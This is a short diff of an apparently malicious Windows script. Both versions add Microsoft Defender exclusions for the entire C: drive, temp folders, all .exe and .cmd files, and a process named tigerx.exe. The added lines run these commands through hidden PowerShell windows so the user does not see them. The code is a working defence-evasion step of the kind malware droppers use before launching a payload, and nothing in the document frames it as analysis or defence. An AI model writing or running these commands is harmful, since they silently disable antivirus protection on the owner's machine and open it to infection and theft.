@@ -1,7 +1,7 @@
-Add-MpPreference -ExclusionPath "C:*","tigerx.exe","C:\Windows\Temp\",".cmd",".exe","$env:TEMP"
-add-mppreference -exclusionprocess $env:TEMP
-add-mppreference -exclusionprocess tigerx.exe
-add-mppreference -exclusionprocess C:\Windows\Temp\
+powershell -windowstyle hidden -command Add-MpPreference -ExclusionPath "C:*","tigerx.exe","C:\Windows\Temp\",".cmd",".exe","$env:TEMP"
+powershell -windowstyle hidden -command add-mppreference -exclusionprocess $env:TEMP
+powershell -windowstyle hidden -command add-mppreference -exclusionprocess tigerx.exe
+powershell -windowstyle hidden -command add-mppreference -exclusionprocess C:\Windows\Temp\
 
 Start-Sleep -Seconds 5
 
